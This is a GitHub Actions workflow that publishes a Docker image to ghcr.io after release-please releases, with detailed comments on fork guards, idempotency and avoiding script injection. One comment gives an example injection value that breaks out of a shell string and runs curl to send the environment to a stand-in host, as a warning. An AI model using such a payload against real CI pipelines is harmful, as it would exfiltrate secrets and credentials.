name: Docker Release

on:
  # Primary trigger: react to release-please (BSOD-257) creating a GitHub
  # Release. The `release: published` event below covers hand-created
  # releases; the `workflow_run` listener below covers release-please,
  # because GitHub Actions deliberately suppresses `release: published`
  # events that are emitted by a workflow using `secrets.GITHUB_TOKEN`
  # (the anti-recursion policy documented at
  # https://docs.github.com/en/actions/security-guides/automatic-token-authentication#using-the-github_token-in-a-workflow).
  # Without this second trigger, every release-please release would
  # silently skip Docker image publication (BSOD-357).
  workflow_run:
    workflows: ["Release Please"]
    types: [completed]
  # Fallback for hand-published GitHub Releases (e.g. emergency re-runs
  # by a maintainer). The idempotency check on the version tag handles
  # the rare case where both this and `workflow_run` fire for the same
  # release.
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      tag_name:
        description: "Git tag name to publish (e.g. v0.1.0). Must already exist in the repository."
        required: true
        type: string
      source_branch:
        description: "Branch the tag was cut from. Set to 'main' to also push a `latest` alias; leave empty for non-main releases."
        required: false
        default: ""
        type: string

permissions:
  contents: read
  packages: write

jobs:
  docker:
    name: Build & push image
    runs-on: ubuntu-latest
    # Insurance against a hung buildx/registry call. The full flow
    # (clone + build + push + tag resolution + idempotency check)
    # should finish well under this; 15 min is the action default.
    timeout-minutes: 15
    # Skip the whole job when the upstream `Release Please` workflow
    # completed unsuccessfully, or was triggered from a fork.
    # workflow_dispatch and direct `release: published` always run.
    #
    # Security: a `workflow_run` event fires for runs of the named
    # workflow in FORKS of this repository too (see
    # https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run).
    # Although fork runs don't have access to secrets, the workflow
    # payload is still attacker-controllable (any field on the run
    # object). Restrict the trigger to runs that originated in our own
    # repository (`head_repository.full_name` == `github.repository`) and
    # to a single named workflow so a malicious fork can't name its
    # workflow "Release Please". The release tag itself is resolved from
    # the GitHub Releases API — never from the payload — so a fork run
    # cannot inject a crafted `tag_name`/`sha`. SonarCloud rule
    # githubactions:S7631 (BSOD-357).
    #
    # BSOD-466: two expressions in the old guard could never be true.
    # `github.repository` is a *string* ("owner/repo"), so dereferencing
    # `.full_name` on it always yielded null and the comparison could
    # never be true; and the `workflow_run` webhook payload has no
    # `outputs` field at all (see the workflow-run schema published by
    # octokit/webhooks: it carries `conclusion`, `name`, `head_branch`,
    # `head_repository`, `head_sha`, ... but no `outputs`), so the
    # upstream job outputs could never be read. Every `workflow_run` run
    # was therefore skipped and no image was ever published from a
    # release.
    #
    # BSOD-775: a Release Please run that did NOT create a release (no
    # conventional commits since the last tag — e.g. a `docs:`-only
    # push) still passes this guard. The release is resolved further
    # down from the GitHub Releases API by matching the upstream run's
    # commit, so such a run resolves to no release at all and ends green
    # without publishing anything.
    if: |
      github.event_name == 'workflow_dispatch' ||
      github.event_name == 'release' ||
      (github.event_name == 'workflow_run' &&
       github.event.workflow_run.conclusion == 'success' &&
       github.event.workflow_run.head_repository.full_name == github.repository &&
       github.event.workflow_run.name == 'Release Please')
    steps:
      - name: Resolve event inputs
        id: inputs
        env:
          # Thread ALL untrusted inputs through env vars rather than
          # interpolating them into `run:` shell directly. This is the
          # standard GitHub-Actions mitigation for script injection:
          # `${{ inputs.X }}` would let a malicious caller (anyone with
          # workflow_dispatch rights) break out of the string with
          # `"; curl evil.example --data "$(env)"; echo "` and run
          # arbitrary shell in a job that holds packages: write and
          # ghcr.io credentials.
          EVENT_NAME: ${{ github.event_name }}
          RELEASE_TAG_NAME: ${{ github.event.release.tag_name }}
          RELEASE_TARGET_COMMITISH: ${{ github.event.release.target_commitish }}
          RELEASE_PRERELEASE: ${{ github.event.release.prerelease }}
          WORKFLOW_RUN_HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
          WORKFLOW_RUN_HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
          DISPATCH_TAG_NAME: ${{ inputs.tag_name }}
          DISPATCH_SOURCE_BRANCH: ${{ inputs.source_branch }}
          # The `workflow_run` payload carries no job outputs (BSOD-466),
          # so the release is resolved from the GitHub Releases API with
          # the workflow's own GITHUB_TOKEN — no long-lived secret. The
          # `contents: read` permission declared above covers it.
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "release" ]; then
            # `target_commitish` is the branch or commit the release-please
            # tag was cut from. Treat only an explicit branch reference
            # to `main` as "on main" so we never push `latest` from a
            # hotfix or back-port branch. release-please with the default
            # squash strategy reports `main` for normal releases.
            if [ "$RELEASE_TARGET_COMMITISH" = "main" ]; then
              ON_MAIN="true"
            else
              ON_MAIN="false"
            fi
            {
              echo "publish=true"
              echo "tag_name=$RELEASE_TAG_NAME"
              echo "prerelease=$RELEASE_PRERELEASE"
              echo "on_main=$ON_MAIN"
              echo "commit_sha="
            } >> "$GITHUB_OUTPUT"
          elif [ "$EVENT_NAME" = "workflow_run" ]; then
            # The `workflow_run` webhook payload has no `outputs` field
            # (BSOD-466), so the upstream job outputs cannot be read from
            # it. The release this run produced is resolved from the
            # GitHub Releases API instead — matched against the commit
            # the upstream run produced (BSOD-775).
            #
            # release-please creates the GitHub Release with
            # `target_commitish` set to the commit it tagged, so the
            # release whose `target_commitish` equals the upstream run's
            # `head_sha` is exactly the release this run created.
            #
            # Matching on the commit — instead of asking the API for the
            # newest *stable* release, which is unrelated to the
            # triggering run — restores the "no release → no-op"
            # behaviour that the pre-BSOD-466 guard provided (that guard
            # expected the upstream payload to carry a release-created
            # flag; the `workflow_run` payload never carried one):
            #   * a Release Please run that created no release (e.g. a
            #     `docs:`-only push) resolves to no release at all and
            #     the run ends green without publishing anything;
            #   * a release whose image was never published is no longer
            #     re-published from the current `main` HEAD under the
            #     old tag.
            #
            # If the API cannot tell us which release to publish, refuse
            # to publish an unversioned image rather than pushing a bogus
            # `:latest` retag.
            #
            # `gh api` prints the response body on stdout for an HTTP
            # error (a 401/404 body is not a release), so the value is
            # only trusted when the call itself succeeded.
            RELEASES_JSON=$(gh api "repos/$GITHUB_REPOSITORY/releases?per_page=10") || RELEASES_JSON=""
            if [ -z "$RELEASES_JSON" ]; then
              echo "::error::Could not resolve a published release tag for the upstream Release Please run. Refusing to publish an unversioned image." >&2
              exit 1
            fi
            RELEASE_JSON=$(printf '%s' "$RELEASES_JSON" | jq --arg sha "$WORKFLOW_RUN_HEAD_SHA" \
              '[.[] | select(.target_commitish == $sha) | select(.draft == false)] | .[0] // empty')
            if [ -z "$RELEASE_JSON" ]; then
              # This upstream run created no release: a legitimate no-op,
              # not a failure. Exit 0 so the run stays green and nothing
              # is published (BSOD-775).
              echo "::notice::The upstream Release Please run ($WORKFLOW_RUN_HEAD_SHA) created no release; nothing to publish."
              {
                echo "publish=false"
                echo "tag_name="
                echo "prerelease="
                echo "on_main=false"
                echo "commit_sha="
              } >> "$GITHUB_OUTPUT"
              exit 0
            fi
            TAG_NAME=$(printf '%s' "$RELEASE_JSON" | jq -r '.tag_name // ""')
            # The commit the release was tagged with. release-please sets
            # `target_commitish` to the commit it tagged, so the image is
            # built from the exact content the version tag names
            # (BSOD-775) — never from the current `main` HEAD.
            RELEASE_SHA=$(printf '%s' "$RELEASE_JSON" | jq -r '.target_commitish // ""')
            if [ -z "$TAG_NAME" ] || [ -z "$RELEASE_SHA" ]; then
              echo "::error::Could not resolve a published release tag for the upstream Release Please run. Refusing to publish an unversioned image." >&2
              exit 1
            fi
            if [ "$WORKFLOW_RUN_HEAD_BRANCH" = "main" ]; then
              ON_MAIN="true"
            else
              ON_MAIN="false"
            fi
            # `prerelease` is left empty on purpose (BSOD-466): the
            # upstream `prerelease` output is gone with the rest of the
            # `workflow_run.outputs.*` reads, and the tag resolved above
            # is the source of truth — `scripts/resolve-docker-tags.mjs`
            # derives the prerelease flag from the tag's semver, so
            # `v1.0.0-rc.1` will NOT push `latest` even from a
            # release-please workflow_run that came from main.
            {
              echo "publish=true"
              echo "tag_name=$TAG_NAME"
              echo "prerelease="
              echo "on_main=$ON_MAIN"
              echo "commit_sha=$RELEASE_SHA"
            } >> "$GITHUB_OUTPUT"
          else
            # workflow_dispatch: there is no GitHub-emitted prerelease
            # flag, so we leave PRERELEASE_FLAG empty. The script
            # (`scripts/resolve-docker-tags.mjs`) interprets an empty /
            # missing `--prerelease` as "derive from the tag's semver",
            # which means a re-publish of `v1.0.0-rc.1` will NOT push
            # `latest` even if source_branch=main.
            if [ "$DISPATCH_SOURCE_BRANCH" = "main" ]; then
              ON_MAIN="true"
            else
              ON_MAIN="false"
            fi
            {
              echo "publish=true"
              echo "tag_name=$DISPATCH_TAG_NAME"
              echo "prerelease="
              echo "on_main=$ON_MAIN"
              echo "commit_sha="
            } >> "$GITHUB_OUTPUT"
          fi

      - name: Log resolved inputs
        env:
          # Thread step outputs through env vars rather than interpolating
          # them into the `run:` shell. `steps.inputs.outputs.tag_name` is
          # set verbatim from the dispatch input one step earlier, so it
          # is transitively untrusted — interpolating it here would
          # reintroduce the script-injection vector the previous commit
          # closed in the "Resolve event inputs" step.
          LOG_TAG_NAME: ${{ steps.inputs.outputs.tag_name }}
          LOG_PRERELEASE: ${{ steps.inputs.outputs.prerelease }}
          LOG_ON_MAIN: ${{ steps.inputs.outputs.on_main }}
          LOG_COMMIT_SHA: ${{ steps.inputs.outputs.commit_sha }}
          LOG_PUBLISH: ${{ steps.inputs.outputs.publish }}
        run: |
          echo "Resolved Docker image inputs:"
          echo "  tag_name=$LOG_TAG_NAME"
          echo "  prerelease=$LOG_PRERELEASE"
          echo "  on_main=$LOG_ON_MAIN"
          echo "  commit_sha=$LOG_COMMIT_SHA"
          echo "  publish=$LOG_PUBLISH"
          if [ "$LOG_PUBLISH" = "false" ]; then
            echo "Nothing to publish: the upstream Release Please run created no release (BSOD-775)."
          fi

      - name: Check out the tagged commit
        id: checkout
        # `continue-on-error` so a tagged commit that cannot be fetched
        # ends the run green instead of red: publishing an image whose
        # content does not match the version tag is worse than not
        # publishing at all (BSOD-775). Every step below is gated on
        # `steps.checkout.outcome == 'success'`, so a failed checkout
        # publishes nothing.
        continue-on-error: true
        if: steps.inputs.outputs.publish != 'false'
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          # Check out the tagged commit so the image is built from the
          # exact commit release-please tagged, not from a re-fetched
          # `main` HEAD (which may have moved past the release).
          #
          # For the `workflow_run` path the commit comes from the
          # resolved release itself (`target_commitish`, BSOD-775), so
          # the image content always matches the version it is tagged
          # with. We still prefer a SHA over a tag ref, because the tag
          # may not yet be visible on `origin` when this downstream
          # workflow fires, and a `ref: <tag>` checkout would race
          # against the upstream's tag push.
          # (BSOD-466)
          ref: ${{ steps.inputs.outputs.commit_sha || steps.inputs.outputs.tag_name }}
          fetch-depth: 1
          persist-credentials: false

      - name: Report a skipped publish
        # The checkout above is `continue-on-error`, so a tagged commit
        # that cannot be fetched leaves the run green — say why, instead
        # of ending silently (BSOD-775).
        if: "steps.inputs.outputs.publish != 'false' && steps.checkout.outcome != 'success'"
        run: |
          echo "::notice::The tagged commit could not be checked out; skipping the publish rather than shipping content that does not match the version tag."

      - name: Resolve source commit SHA
        id: source
        if: "steps.inputs.outputs.publish != 'false' && steps.checkout.outcome == 'success'"
        run: |
          set -euo pipefail
          SHA=$(git rev-parse HEAD)
          echo "commit_sha=$SHA" >> "$GITHUB_OUTPUT"
          echo "Source commit: $SHA"

      - name: Resolve Docker tags
        id: tags
        if: "steps.inputs.outputs.publish != 'false' && steps.checkout.outcome == 'success'"
        env:
          TAG_NAME: ${{ steps.inputs.outputs.tag_name }}
          PRERELEASE: ${{ steps.inputs.outputs.prerelease }}
          ON_MAIN: ${{ steps.inputs.outputs.on_main }}
          IMAGE_OWNER: ${{ github.repository_owner }}
        run: |
          set -euo pipefail
          JSON=$(node scripts/resolve-docker-tags.mjs \
            --tag-name="$TAG_NAME" \
            --prerelease="$PRERELEASE" \
            --on-main="$ON_MAIN")
          echo "Computed tags payload: $JSON"

          {
            echo "Image refs to push:"
            echo "$JSON" | jq -r --arg registry "ghcr.io" \
              --arg owner "$IMAGE_OWNER" \
              --arg name "team-dash" \
              '.tags[] | "  " + "\($registry)/\($owner)/\($name):\(.)"'
          }

          {
            echo "tags_json=$JSON"
            echo "image_refs<<EOF"
            echo "$JSON" | jq -r --arg registry "ghcr.io" \
              --arg owner "$IMAGE_OWNER" \
              --arg name "team-dash" \
              '.tags[] | "\($registry)/\($owner)/\($name):\(.)"'
            echo "EOF"
          } >> "$GITHUB_OUTPUT"

      - name: Set up Docker Buildx
        if: "steps.inputs.outputs.publish != 'false' && steps.checkout.outcome == 'success'"
        uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1

      - name: Log in to ghcr.io
        if: "steps.inputs.outputs.publish != 'false' && steps.checkout.outcome == 'success'"
        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Check whether the version is already published (idempotent)
        id: check
        if: "steps.inputs.outputs.publish != 'false' && steps.checkout.outcome == 'success'"
        env:
          VERSION: ${{ fromJSON(steps.tags.outputs.tags_json).version }}
          OWNER: ${{ github.repository_owner }}
        run: |
          set -euo pipefail
          IMAGE="ghcr.io/${OWNER}/team-dash:${VERSION}"
          # `docker buildx imagetools inspect` reads from the same
          # credential store the login-action populated. Exit 0 means the
          # manifest exists; non-zero means the tag is not in the
          # registry.
          #
          # Assumption: `docker/build-push-action` pushes all tags in a
          # single call, so a successful push of `<version>` implies
          # `<major>.<minor>` and `latest` are also live in the registry
          # (same manifest). This is why inspecting just the primary
          # version tag is enough to skip — if a partial push ever
          # somehow lands (network blip mid-call), the next manual
          # workflow_dispatch re-run with a different tag would be the
          # recovery path, not this idempotency guard.
          #
          # BSOD-357: this idempotency check also handles the case
          # where both `release: published` and `workflow_run` fire for
          # the same release (the dual-trigger overlap is documented at
          # the top of this file).
          if docker buildx imagetools inspect "$IMAGE" >/dev/null 2>&1; then
            echo "::notice::Image ${IMAGE} already published; skipping build/push (idempotent no-op)."
            echo "already_published=true" >> "$GITHUB_OUTPUT"
          else
            echo "already_published=false" >> "$GITHUB_OUTPUT"
          fi

      - name: Build & push
        if: "steps.inputs.outputs.publish != 'false' && steps.checkout.outcome == 'success' && steps.check.outputs.already_published != 'true'"
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          file: docker/Dockerfile
          push: true
          tags: ${{ steps.tags.outputs.image_refs }}
          labels: |
            org.opencontainers.image.title=team-dash
            org.opencontainers.image.version=${{ fromJSON(steps.tags.outputs.tags_json).version }}
            org.opencontainers.image.source=${{ github.server_url }}/${{ github.repository }}
            org.opencontainers.image.revision=${{ steps.source.outputs.commit_sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
